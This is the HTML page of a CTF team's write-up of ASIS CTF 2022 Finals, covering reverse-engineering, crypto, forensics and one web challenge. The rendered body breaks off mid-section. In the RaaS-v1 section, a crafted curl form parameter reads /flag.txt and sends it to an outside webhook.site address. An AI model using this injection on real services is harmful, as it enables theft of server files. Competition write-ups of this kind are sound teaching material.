<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>ASIS CTF 2022 Finals Writeup | Black Bauhinia</title>

<meta name="keywords" content="ctf" />
<meta name="description" content="Our collection of writeups for ASIS CTF 2022.">
<meta name="author" content="fsharp, grhkm, harrier, LifeIsHard, Mystiz, Viky">
<link rel="canonical" href="https://b6a.black/posts/2023-01-10-asisctf/" />
<link href="/assets/css/stylesheet.min.79c4dfee3993cd3110886e38d36a5106e0d6922344cefa3ff5c0076f246815f0.css" integrity="sha256-ecTf7jmTzTEQiG4402pRBuDWkiNEzvo/9cAHbyRoFfA=" rel="preload stylesheet"
    as="style">

<link rel="icon" href="https://b6a.black/favicon.ico">

<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.91.0" />




<script async src="https://www.googletagmanager.com/gtag/js?id=G-M67YZZ2MP1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-M67YZZ2MP1');
</script>



<script src="https://kit.fontawesome.com/fbbadced05.js" crossorigin="anonymous"></script>


<link rel="preconnect" href="https://fonts.gstatic.com">
<link href="https://fonts.googleapis.com/css2?family=Recursive&display=swap" rel="stylesheet"> 


<meta property="og:title" content="ASIS CTF 2022 Finals Writeup" />
<meta property="og:description" content="Our collection of writeups for ASIS CTF 2022." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://b6a.black/posts/2023-01-10-asisctf/" />
<meta property="article:published_time" content="2023-01-10T22:20:00+08:00" />
<meta property="article:modified_time" content="2023-01-10T22:20:00+08:00" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="ASIS CTF 2022 Finals Writeup"/>
<meta name="twitter:description" content="Our collection of writeups for ASIS CTF 2022."/>

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "ASIS CTF 2022 Finals Writeup",
  "name": "ASIS CTF 2022 Finals Writeup",
  "description": "Our collection of writeups for ASIS CTF 2022.",
  "keywords": [
    "ctf"
  ],
  "articleBody": "Rexy (Reverse, 53 solves) Solved by fsharp\nA Linux program and an encrypted flag are provided. Opening the program in Ghidra, we find that it reads the plaintext flag from a file before passing it into an encryption function that involves randomness from rand(), buffers that get allocated only to be freed up without being used, and base conversions.\nLooking closer, some parts of this function are actually redundant and only exist to confuse us. The actual encryption algorithm is quite simple and can be written as:\ndef encrypt(pt): ct = \"\" pos = 0 for c in pt: pos += 1 pos_squared = (pos ** 2) ^ 0x19 xord_c = ord(c) ^ pos_squared ^ 0x69b2 ^ 0x11f0b8 based_c = format(int(format(xord_c, 'o')), 'X') ct += based_c ct = ct[::-1] + \"5ADB\" return ct We write the decryption algorithm and get the flag:\ndef decrypt(ct): pt = \"\" pos = 0 ct = ct.rstrip(\"5ADB\")[::-1] for i in range(0, len(ct), 6): pos += 1 pos_squared = (pos ** 2) ^ 0x19 based_c = ct[i : i + 6] xord_c = int(str(int(based_c, 16)), 8) c = chr(xord_c ^ pos_squared ^ 0x69b2 ^ 0x11f0b8) pt += c return pt encrypted = open(\"flag.enc\").read().strip() flag = decrypt(encrypted) print(flag) The plaintext is:\nCongratulation! You got the flag: +ASIS{W00twootW00t_HappyNewYear}+ Have fun and good luck new year!! Deserve (Reverse, 32 solves) Solved by harrier, grhkm\nWe are given an ARM binary that takes input from stdin and outputs an encoded message. By disassembling the binary, we see that the main function is located at 0xBE0. We decided to perform static analysis first, which in hindsight is not the best idea, but we will see why later.\nThe code can be splitted into two parts.\n  Here is the first part:  __int64 __fastcall sub_BE0(_BYTE *a1, unsigned __int64 *input_len) { // ... input = a1; v3 = *input_len; v5 = malloc(4 * input_len); if ( !v5 ) sub_F60(\"malloc\"); if ( v3 ) { v6 = 0LL; i = 0LL; b_loc_table = (__int64 *)__ctype_b_loc(); v9 = 0; do { cur_char = (unsigned __int8)input[i]; v3 = v6; v11 = *b_loc_table; // Check 1 if ( (*b_loc_table + 2LL * cur_char) \u0026 8 ) { ++v9; *(_BYTE *)(v5 + v6) = cur_char; v6 = v9; v3 = v9; } // Check 2 else if ( cur_char == 32 ) { if ( v9  1 \u0026\u0026 (v11 + 2LL * *(unsigned __int8 *)(v5 + v6 - 1)) \u0026 0x200 \u0026\u0026 (v5 + v6 - 2) == '+' ) { v39 = *(unsigned __int8 *)(v5 + v6 - 1); *(_BYTE *)(v5 + v6 - 1) = *(_DWORD *)(*(_QWORD *)__ctype_toupper_loc() + 4 * v39); } else { ++v9; *(_BYTE *)(v5 + v6) = '/'; v6 = v9; v3 = v9; } } else { if ( !input[i] ) goto LABEL_9; // Check 3 v33 = strchr(\"@$_!\\\"#%\u0026'()*+,-./:;?\\n\", (unsigned __int8)input[i]); if ( v33 ) { v34 = v9 + 1; v9 += 2; *(_BYTE *)(v5 + v6) = '+'; v6 = v9; v3 = v9; *(_BYTE *)(v5 + v34) = v33 - (unsigned __int64)\"@$_!\\\"#%\u0026'()*+,-./:;?\\n\" + 0x61; } else { // Check 4 v35 = strchr(\"[\\\\]^{|}~`\\t\", v10); if ( !v35 ) LABEL_9: sub_F30(\"Invalid input! Sorry!!\", v11); v36 = v9 + 1; v37 = v9 + 2; v9 += 3; *(_BYTE *)(v5 + v6) = '+'; v6 = v9; *(_BYTE *)(v5 + v36) = '+'; v3 = v9; *(_BYTE *)(v5 + v37) = v35 - (unsigned __int64)\"[\\\\]^{|}~`\\t\" + 0x61; } } ++i; } while ( i  As annotated, there are multiple checks. The binary first checks (*b_loc_table + 2LL * cur_char) \u0026 8, where b_loc_table is the returned pointer from __ctype_b_loc(). Looking into C header files, we see that the function __ctype_b_loc is defined inside ctype.h, where it has the following comment:\n/* These point into arrays of 384, so they can be indexed by any `unsigned char' value [0,255]; by EOF (-1); or by any `signed char' value [-128,-1). ISO C requires that the ctype functions work for `unsigned char' values and for EOF; we also support negative `signed char' values for broken old programs. The case conversion arrays are of `int's rather than `unsigned char's because tolower (EOF) must be EOF, which doesn't fit into an `unsigned char'. But today more important is that the arrays are also used for multi-byte character sets. */ extern const unsigned short int **__ctype_b_loc (void) __THROW __attribute__ ((__const__)); #define __isctype(c, type) ((*__ctype_b_loc ())[(int) (c)] \u0026 (unsigned short int) type) #define isalnum(c) __isctype((c), _ISalnum)  // LITTLE ENDIAN #define _ISbit(bit) ((bit)  8))  enum { _ISupper = _ISbit (0), /* UPPERCASE. */ _ISlower = _ISbit (1), /* lowercase. */ _ISalpha = _ISbit (2), /* Alphabetic. */ _ISdigit = _ISbit (3), /* Numeric. */ _ISxdigit = _ISbit (4), /* Hexadecimal numeric. */ _ISspace = _ISbit (5), /* Whitespace. */ _ISprint = _ISbit (6), /* Printing. */ _ISgraph = _ISbit (7), /* Graphical. */ _ISblank = _ISbit (8), /* Blank (usually SPC and TAB). */ _IScntrl = _ISbit (9), /* Control character. */ _ISpunct = _ISbit (10), /* Punctuation. */ _ISalnum = _ISbit (11) /* Alphanumeric. */ }; In short, its just a “character characteristic” lookup table, a C way to check isalpha / etc.\nThe above code is equivalent to something like this in pseudocode:\nstorage = \"\" for all char c in input: if c is alphabetic: storage += c else if c is space: if previous two in storage is ~=`+[a-zA-Z0-9]`: update the previous two to become upper case else: storage += \"/\" else: charset = \"@$_!\\\"#%\u0026'()*+,-./:;?\\n\" if c in charset: index = charset.find(c) storage += f\"+{index}\" else: charset = \"[\\\\]^{|}~`\\t\" if not in charset: return error and exit storage += f\"++{index}\" if len(storage) mod 3 != 0: storage += \"/\" * (3 - len(storage) mod 3) storage = base64_decode(storage) At first, I was so puzzled as I misread the first condition thinking it only checks for numeric characters (turns out it is checking for alphanumeric characters instead, so it make perfect sense), and this makes no sense if the input is a flag.\nAnd my teammate grhkm reminds me I should try base64 conversion first, and I see this:\nCompressin g/short/messages/is/essential+Nso/ASIS/has/developed/new/one+xThe/flag/for/t his/task/is+RASIS++ec0mprEs51nG+csHOr7+ct3xT+cmE5s49es+cASIS+d++g/// So clearly this is the flag, and we can just reverse the ++e etc syntax with the algorithm we reverse above. And this yields us the flag easily.\nRaaS-v1 (Web, 68 solves) Solved by fsharp\nWe’re given a URL and an archive file containing the source code for the webpage. The goal is to read the contents of /flag.txt by exploiting a vulnerability.\nThe webpage allows us to request any webpage with a request method of our choice and with the ability to send any form data. The source code is:\nphp if($_SERVER['REMOTE_ADDR'] == '127.0.0.1'){ die('curl :thonk:'); } $url = 'http://localhost'; $method = 'GET'; $formParams = []; if(isset($_GET['url'])){ $url = $_GET['url']; } if(isset($_GET['method'])){ $method = $_GET['method']; } if(isset($_GET['formParams'])){ $formParams = $_GET['formParams']; } $cmd = 'curl '; $cmd .= '--proto -file '; $cmd .= escapeshellarg($url).' '; $cmd .= '-X '; $cmd .= escapeshellarg($method).' '; foreach($formParams as $key = $value){ if(preg_match(\"/^\\w+$/\",$key)){ $cmd .= '-F '; $cmd .= escapeshellarg($key.'= '.$value); } } header('Content-Type: text/plain'); system($cmd); Our parameters are passed to the escapeshellarg() function, which adds quotes around them.\nAs hinted by the challenge description, the vulnerability could be found if one reads the documentation of the curl command carefully. Referring to the -F section of its manpage, it can be seen that custom headers could be added to the request by reading from a file as follows:\ncurl -F \"submit=OK;headers=@headerfile\" example.com\nIt is important to note that $key and $value are not filtered at all (e.g. check if characters like @, ;, = or / are included), which means it is possible for us to use the above command format to read from any file.\nBy opening a webhook and sending data to it by navigating to http://raas-v1.asisctf.com:9000/?url=https://webhook.site/blah\u0026formParams[a]=b;headers=@/flag.txt, we can forge the following command:\ncurl --proto -file 'https://webhook.site/blah' -X 'GET' -F 'a= b;headers=@/flag.txt'\n…and get the flag!\nBedouin (Crypto, 79 solves) Solved by LifeIsHard\nThe challenge encrypts the message through RSA, but with a unique(ly weak) way of generating the parameters, defined as follows:\nfrom secret import nbit, l, flag def genbed(nbit, l): while True: zo = bin(getPrime(nbit))[2:] OZ = zo * l + '1' if isPrime(int(OZ)): return int(OZ) p, q = [genbed(nbit, l) for _ in '01'] n = p * q d = 1 ^ l ** nbit In short, the algorithm first generates $p$ and $q$ by\n Defining $l$ and $b$ (nbit in the code), both unknown to us Generates a (essentially) random $b$-digit binary string $zo$ Define $p = \\underbrace{zo \\mathbin\\Vert zo \\mathbin\\Vert \\cdots \\mathbin\\Vert zo}_{l , \\mathrm{of} , zo} \\mathbin\\Vert 1$ and interpret it as a base-10 integer If $p$ is not a prime, repeat the generation process. $q$ is generated in the same manner.  Now, the algorithm generates the remaining RSA parameters by\n $N = pq$ $d = \\left(27 \\cdot l^{b}\\right) \\mathbin{|} 1$ $e = d^{-1} \\ \\mathrm{mod} \\ (p - 1)(q - 1)$ $c = m^e \\ \\mathrm{mod} \\ N$  Firstly, from the output given we see that $N$ is a $617$-digit integer. On the other hand, the generation process shows that $p$ and $q$ have $(lb + 1)$ digits, meaning that $N = pq$ has either $2(lb + 1) - 1$ or $2(lb + 1)$ digits. From this, we deduce that $lb = 308$, which means $b$ is one of the divisors of $308 = 2^2 \\cdot 7 \\cdot 11$. Trying each divisor in order and computing the corresponding $d$, we get the correct answer $(l, b) = (11, 28)$.\nMonward (Crypto, 30 solves) Solved by Mystiz\nGroebner basis is the perfect tool to solve annoying system of equations. Using the relation given by monon(C, P) == monon(C, Q) == monon(C, R) == monon(C, enc), we can construct an ideal from which we can recover $a$, $d$ and $p$. See the code for more details:\nV.= ZZ['a, d, p'] terms = [] for (x, y) in [P, Q, R, enc]: terms.append(a * x^2 + y^2 - d * x^2 * y^2 - 1) I = Ideal(V, terms) I.groebner_basis() # [a + 110062003148225401725628246404818446720450976623225313995311, # d + 154490734938099229849569067657352117192562308729750369601751, # 209488070485061880311886074351169939903472896311680134404680] Eventually we found\np = 5237201762126547007797151858779248497586822407792003360117 d = 2625317925697180384345488106025337735042363504009731201759 a = 5156435618558632445909094488325020226459116348198759927263 We can also retrieve the order of the curve being q = 5237201762126547007797151858841639845712665151660067904384, which can be factorized to\n$$\\begin{aligned} 2^7 \u0026 \\times 7 \\times 1283 \\times 537221 \\times 922861 \\times 2073361 \\\\ \u0026 \\times 14270791 \\times 91806719 \\times 1025744989 \\times 3297907903. \\end{aligned}$$\nSince I am lazy to map the Edward’s curve into a standard elliptic curve for discrete log, I implemented the Pohlig-Hellman algorithm myself. Eventually we got the flag ASIS{MoN7g0m3ry_EdwArd5_cuRv3}.\nVindica (Crypto, 32 solves) Solved by LifeIsHard\nThe challenge first generates parameters $p$, $q$, $e$, $n = pq$ and $N = (p^2 - 1)(q^2 - 1)$. It then encrypts the flag in a RSA-like protocol, defined as follows:\ndef two_layencrypt(msg, pkey): e, n, _ = pkey Zn = Zmod(n) m = bytes_to_long(msg) c = pow(m, e, n) _c = str(c) l = len(_c) _C = matrix(Zn, [[_c[:l//4], _c[l//4:l//2]], [_c[l//2:3*l//4], _c[3*l//4:l]]]) assert gcd(det(_C), n) == 1 C = _C ** e return C In addition to the encrypted matrix, we are also given $e, n, N$.\nIn short, the algorithm\n Encrypts the flag with normal RSA by raising it to the $e^{\\mathrm{th}}$ power modulo $n$. Splits the base-10 digits of $c$ into four pieces $c_1, c_2, c_3, c_4$  For example, $c = 12345678 \\to (c_1, c_2, c_3, c_4) = (12, 34, 56, 78)$.   Encrypts the matrix $\\bigl( \\begin{smallmatrix} c_1 \u0026 c_2 \\ c_3 \u0026 c_4 \\end{smallmatrix} \\bigr)$ with RSA again by raising it to the $e^{\\mathrm{th}}$ power modulo $n$.  It is clear that our goal is to recover the primes $p$ and $q$. We note that since we are given both $n$ and $N$, both of which are defined by $p$ and $q$, we have the following system of equations:\n$$ \\begin{cases} n = pq \\\\ N = (p^2 - 1)(q^2 - 1) \\end{cases} $$\nSolution 1 (LifeIsHard) One method to solve the equations is by rewriting $N = p^2q^2 - (p^2 + q^2) + 1 = n^2 + 2n + 1 - (p + q)^2$. Then, we can recover $p + q$. Finally, note that $p$ and $q$ are roots to the quadratic polynomial $(x - p)(x - q) = x^2 - (p + q)x + n$, we can factor $p$ and $q$.\nSolve script (excerpt):\nfrom z3 import * p = Int('p') q = Int('q') print(solve((p**2 - 1)*(q**2 - 1) == N, p * q == n))  Solution 2 (grhkm) Another method to solve this is using Groebner basis. We construct the Ideal $\\left\\subset \\mathbb{Z}[p, q]$, and hope one of the reduced terms is univariate. Note that the default ordering in Sage is degrevlex, standing for “Degree reverse lexicographic”. However, the degree of the reduced basis doesn’t matter for us, just that it is univariate. Therefore, the lex ordering is more suitable for us.\nSolve script (excerpt):\np, q = ZZ['p, q'].change_ring(order='lex').gens() I = Ideal([n - p * q, N - (p^2 - 1) * (q^2 - 1)]) for basis in I.groebner_basis(): try: print(basis.univariate_polynomial().roots()) except TypeError as e: pass  Finally, we can recover $c$ by $c = C^{(e^{-1} \\ \\mathrm{mod} \\ N)}$, and decrypt RSA as usual for the flag.\nWhy is $N$ even provided? Well, it is supposed to serve as the public key modulus for the matrix group $GL(2, \\mathbb{Z} / n\\mathbb{Z})$, also known as the group of all invertible $2 \\times 2$ matrices. By considering the size of the group under mod $p$ and mod $q$ and applying the Chinese Remainder Theorem, we get the modulus! This is also how the decryption process works.  Rhyton (Crypto, 17 solves) Solved by Mystiz, LifeIsHard, grhkm\nIn the problem, we are given L = 110 sets of data, generated through the following code:\n# nbit, delta, L = 512, 0.14, 110 def gen_rhyton(nbit, delta, L): p, q = [getPrime(nbit) for _ in '01'] n = p * q D = int(n ** (1 - delta)) phi = (p - 1) * (q - 1) V = [getRandomRange(1, n - 1) for _ in range(L)] U = [phi * v // n for v in V] W, i = [], 0 while True: w = getRandomRange(phi * V[i] - U[i] * n - D, phi * V[i] - U[i] * n + D) if abs(phi * V[i] - U[i] * n - w)  D and w  n: W.append(w) i += 1 if i == L: break return (p, q, U, V, W) In short, the function\n Generates 512-bit primes $p$ and $q$ and computes $\\varphi = (p - 1)(q - 1)$ and $N = pq$ Defines $D := \\lfloor N^{0.86} \\rfloor$ Generates 110 random integers $v_i \\in [1, N - 1)$ Defines $u_i := \\lfloor \\frac{\\varphi v_i}{N} \\rfloor$ Defines $X_i := \\varphi v_i - N u_i$ Generate 110 random integers $w_i \\in [X_i - D, X_i + D)$. Returns the data $(p, q, (v_i, u_i, w_i))$.  Firstly, we can rewrite the defining definition of $w_i$ as\n$$|w_i - X_i| This means that the quantity $w_i + Nu_i - \\varphi v_i$ is “small”. Furthermore, since the quantities $N, w_i, v_i$ are known, this is a standard application of lattice-reduction algorithms. As a note, we may write $\\varphi = N - \\varphi'$, where $\\varphi' \\approx N^{0.5}$, which may perform better in the lattice.\nLattice construction ($110 \\times 112$):\n$$\\begin{pmatrix} w_0 \u0026 w_1 \u0026 \\cdots \u0026 w_{109} \u0026 1 \u0026 n \\\\ -v_0 \u0026 -v_1 \u0026 \\cdots \u0026 -v_{109} \u0026 0 \u0026 -1 \\\\ n \u0026 0 \u0026 \\cdots \u0026 0 \u0026 0 \u0026 0 \\\\ 0 \u0026 n \u0026 \\cdots \u0026 0 \u0026 0 \u0026 0 \\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \u0026 \\vdots \u0026 \\vdots \\\\ 0 \u0026 0 \u0026 \\cdots \u0026 n \u0026 0 \u0026 0 \\end{pmatrix}$$\nSolve script:\nfor i in range(110): A[0, i] = W[i] A[1, i] = -V[i] A[2+i, i] = n if True: A[0, 110] = 1 A[0, 111] = n A[1, 111] = -1 weights = [1/int(n^0.86) for _ in range(110)] + [1, 1/int(n^0.5)] Q = diagonal_matrix(weights) A *= Q A = A.LLL() #  A /= Q Fun fact: The solve script works with $4$ data points instead of $110$.  Basic (Forensics + Misc, 34 solves) Solved by fsharp\nA file called basic.raw is given to us.\nOpening it in a hex editor, it appears to be a corrupted Stata .dta file. Referring to a website that describes the file format and the sample file it references, we can notice 3 errors with the file and fix them manually as follows:\n The beginning of the file should be replaced with 118. The end of the file should be replaced with rls. ‘Blank’ regions of the file should contain 0x00s. So, replace the 0xA3s in the varnames section with 0x00s.  Afterwards, we can read the file using the Pandas library. We get a few hundred rows of data, where each row contains 3 columns:\n position: A number. isflagchar: Is this a character for the flag? md5charsalt: An MD5 hash.  The description of the md5charsalt variable given by the file is specifically md5(char + 'SALT'). I took it literally and tried to find the characters with the salt as SALT, but none were found.\nInitially, I was confused with what the challenge was asking for. However, Mystiz looked up a few of those hashes on reverse MD5 websites and found that the salt was actually s4Lt. Thanks to his help and with a little more guessing, I was able to complete my script and solve this challenge:\nfrom hashlib import md5 from pandas import read_stata df = read_stata(\"repaired.dta\") hashes = set() flag = [] for (position, isflagchar, md5charsalt) in zip(df[\"position\"], df[\"isflagchar\"], df[\"md5charsalt\"]): if isflagchar == 'Y': hashes.add(md5charsalt) flag.append([position, md5charsalt]) hashes = list(hashes) flag = [md5charsalt for [position, md5charsalt] in sorted(flag)] for hash in hashes: for c in range(32, 127): s = \"s4Lt\" + chr(c) if md5(s.encode()).hexdigest() == hash: for i in range(len(flag)): if flag[i] == hash: flag[i] = chr(c) break print(''.join(flag)) ",
  "wordCount" : "3095",
  "inLanguage": "en",
  "datePublished": "2023-01-10T22:20:00+08:00",
  "dateModified": "2023-01-10T22:20:00+08:00",
  "author":[{
    "@type": "Person",
    "name": "fsharp"
  }, {
    "@type": "Person",
    "name": "grhkm"
  }, {
    "@type": "Person",
    "name": "harrier"
  }, {
    "@type": "Person",
    "name": "LifeIsHard"
  }, {
    "@type": "Person",
    "name": "Mystiz"
  }, {
    "@type": "Person",
    "name": "Viky"
  }],
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://b6a.black/posts/2023-01-10-asisctf/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Black Bauhinia",
    "logo": {
      "@type": "ImageObject",
      "url": "https://b6a.black/favicon.ico"
    }
  }
}
</script>



</head>

<body class=" dark" id="top">
<noscript>
    <style type="text/css">
        .theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://b6a.black/" accesskey="h" title="Black Bauhinia (Alt + H)">Black Bauhinia</a>
            <span class="logo-switches">
                
                
            </span>
        </div>
        <ul id="menu" onscroll="menu_on_scroll()">
            <li>
                <a href="https://b6a.black/about-us/" title="About Us">
                    <span>About Us</span>
                </a>
            </li></ul>
    </nav>
</header>

    <main class="main">

<article class="post-single">
  <header class="post-header">

    <h1 class="post-title">
      ASIS CTF 2022 Finals Writeup
    </h1>
    <div class="post-meta">

January 10, 2023&nbsp;·&nbsp;fsharp, grhkm, harrier, LifeIsHard, Mystiz, Viky

</div>
  </header>
  
  
  <div class="post-content js-toc-content">
<h2 id="rexy-reverse-53-solves">Rexy (Reverse, 53 solves)<a hidden class="anchor" aria-hidden="true" href="#rexy-reverse-53-solves">#</a></h2>
<p><em>Solved by fsharp</em></p>
<p>A Linux program and an encrypted flag are provided. Opening the program in Ghidra, we find that it reads the plaintext flag from a file before passing it into an encryption function that involves randomness from <code>rand()</code>, buffers that get allocated only to be freed up without being used, and base conversions.</p>
<p>Looking closer, some parts of this function are actually redundant and only exist to confuse us. The actual encryption algorithm is quite simple and can be written as:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(pt):
    ct <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    pos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    <span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> pt:
        pos <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
        pos_squared <span style="color:#f92672">=</span> (pos <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x19</span>
        xord_c <span style="color:#f92672">=</span> ord(c) <span style="color:#f92672">^</span> pos_squared <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x69b2</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x11f0b8</span>
        based_c <span style="color:#f92672">=</span> format(int(format(xord_c, <span style="color:#e6db74">&#39;o&#39;</span>)), <span style="color:#e6db74">&#39;X&#39;</span>)
        ct <span style="color:#f92672">+=</span> based_c
    ct <span style="color:#f92672">=</span> ct[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;5ADB&#34;</span>
    <span style="color:#66d9ef">return</span> ct
</code></pre></div><p>We write the decryption algorithm and get the flag:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(ct):
    pt <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
    pos <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
    ct <span style="color:#f92672">=</span> ct<span style="color:#f92672">.</span>rstrip(<span style="color:#e6db74">&#34;5ADB&#34;</span>)[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(ct), <span style="color:#ae81ff">6</span>):
        pos <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
        pos_squared <span style="color:#f92672">=</span> (pos <span style="color:#f92672">**</span> <span style="color:#ae81ff">2</span>) <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x19</span>
        based_c <span style="color:#f92672">=</span> ct[i : i <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>]
        xord_c <span style="color:#f92672">=</span> int(str(int(based_c, <span style="color:#ae81ff">16</span>)), <span style="color:#ae81ff">8</span>)
        c <span style="color:#f92672">=</span> chr(xord_c <span style="color:#f92672">^</span> pos_squared <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x69b2</span> <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x11f0b8</span>)
        pt <span style="color:#f92672">+=</span> c
    <span style="color:#66d9ef">return</span> pt

encrypted <span style="color:#f92672">=</span> open(<span style="color:#e6db74">&#34;flag.enc&#34;</span>)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>strip()
flag <span style="color:#f92672">=</span> decrypt(encrypted)
print(flag)
</code></pre></div><p>The plaintext is:</p>
<pre tabindex="0"><code>Congratulation! You got the flag:
+ASIS{W00twootW00t_HappyNewYear}+
Have fun and good luck new year!!
</code></pre><h2 id="deserve-reverse-32-solves">Deserve (Reverse, 32 solves)<a hidden class="anchor" aria-hidden="true" href="#deserve-reverse-32-solves">#</a></h2>
<p><em>Solved by harrier, grhkm</em></p>
<p>We are given an ARM binary that takes input from stdin and outputs an encoded message. By disassembling the binary, we see that the main function is located at 0xBE0. We decided to perform static analysis first, which in hindsight is not the best idea, but we will see why later.</p>
<p>The code can be splitted into two parts.</p>
<details>
    <summary> Here is the first part: </summary>
<pre tabindex="0"><code class="language-c=" data-lang="c=">__int64 __fastcall sub_BE0(_BYTE *a1, unsigned __int64 *input_len) {
    // ...
    input = a1;
    v3 = *input_len;
    v5 = malloc(4 * input_len);
    if ( !v5 )
      sub_F60(&quot;malloc&quot;);
    if ( v3 ) {
    v6 = 0LL;
    i = 0LL;
    b_loc_table = (__int64 *)__ctype_b_loc();
    v9 = 0;
    do
    {
      cur_char = (unsigned __int8)input[i];
      v3 = v6;
      v11 = *b_loc_table;
        
      // Check 1
      if ( (*b_loc_table + 2LL * cur_char) &amp; 8 )
      {
        ++v9;
        *(_BYTE *)(v5 + v6) = cur_char;
        v6 = v9;
        v3 = v9;
      }
        
      // Check 2
      else if ( cur_char == 32 )
      {
        if ( v9 &gt; 1
          &amp;&amp; (v11 + 2LL * *(unsigned __int8 *)(v5 + v6 - 1)) &amp; 0x200
          &amp;&amp; (v5 + v6 - 2) == '+' )
        {
          v39 = *(unsigned __int8 *)(v5 + v6 - 1);
          *(_BYTE *)(v5 + v6 - 1) = *(_DWORD *)(*(_QWORD *)__ctype_toupper_loc() + 4 * v39);
        }
        else
        {
          ++v9;
          *(_BYTE *)(v5 + v6) = '/';
          v6 = v9;
          v3 = v9;
        }
      }
        
      else
      {
        if ( !input[i] )
          goto LABEL_9;
        
        // Check 3
        v33 = strchr(&quot;@$_!\&quot;#%&amp;'()*+,-./:;&lt;=&gt;?\n&quot;, (unsigned __int8)input[i]);
        if ( v33 )
        {
          v34 = v9 + 1;
          v9 += 2;
          *(_BYTE *)(v5 + v6) = '+';
          v6 = v9;
          v3 = v9;
          *(_BYTE *)(v5 + v34) = v33 - (unsigned __int64)&quot;@$_!\&quot;#%&amp;'()*+,-./:;&lt;=&gt;?\n&quot; + 0x61;
        }
          
        else
        {
          // Check 4
          v35 = strchr(&quot;[\\]^{|}~`\t&quot;, v10);
          if ( !v35 )
    LABEL_9:
            sub_F30(&quot;Invalid input! Sorry!!&quot;, v11);
          v36 = v9 + 1;
          v37 = v9 + 2;
          v9 += 3;
          *(_BYTE *)(v5 + v6) = '+';
          v6 = v9;
          *(_BYTE *)(v5 + v36) = '+';
          v3 = v9;
          *(_BYTE *)(v5 + v37) = v35 - (unsigned __int64)&quot;[\\]^{|}~`\t&quot; + 0x61;
        }
      }
      ++i;
    }
    while ( i &lt; len );
    // ...
}
</code></pre></details> 
<p>As annotated, there are multiple checks. The binary first checks <code>(*b_loc_table + 2LL * cur_char) &amp; 8</code>, where <code>b_loc_table</code> is the returned pointer from <code>__ctype_b_loc()</code>. Looking into C header files, we see that the function <code>__ctype_b_loc</code> is defined inside <code>ctype.h</code>, where it has the following comment:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
</span><span style="color:#75715e">   These point into arrays of 384, so they can be indexed by any `unsigned
</span><span style="color:#75715e">   char&#39; value [0,255]; by EOF (-1); or by any `signed char&#39; value
</span><span style="color:#75715e">   [-128,-1).  ISO C requires that the ctype functions work for `unsigned
</span><span style="color:#75715e">   char&#39; values and for EOF; we also support negative `signed char&#39; values
</span><span style="color:#75715e">   for broken old programs.  The case conversion arrays are of `int&#39;s
</span><span style="color:#75715e">   rather than `unsigned char&#39;s because tolower (EOF) must be EOF, which
</span><span style="color:#75715e">   doesn&#39;t fit into an `unsigned char&#39;.  But today more important is that
</span><span style="color:#75715e">   the arrays are also used for multi-byte character sets.
</span><span style="color:#75715e">*/</span>

<span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">short</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">**</span><span style="color:#a6e22e">__ctype_b_loc</span> (<span style="color:#66d9ef">void</span>) __THROW __attribute__ ((__const__));

<span style="color:#75715e">#define __isctype(c, type) ((*__ctype_b_loc ())[(int) (c)] &amp; (unsigned short int) type)
</span><span style="color:#75715e">#define isalnum(c)     __isctype((c), _ISalnum)
</span><span style="color:#75715e"></span>
<span style="color:#75715e">// LITTLE ENDIAN
</span><span style="color:#75715e"></span><span style="color:#75715e">#define _ISbit(bit) ((bit) &lt; 8 ? ((1 &lt;&lt; (bit)) &lt;&lt; 8) : ((1 &lt;&lt; (bit)) &gt;&gt; 8))
</span><span style="color:#75715e"></span>
<span style="color:#66d9ef">enum</span>
{
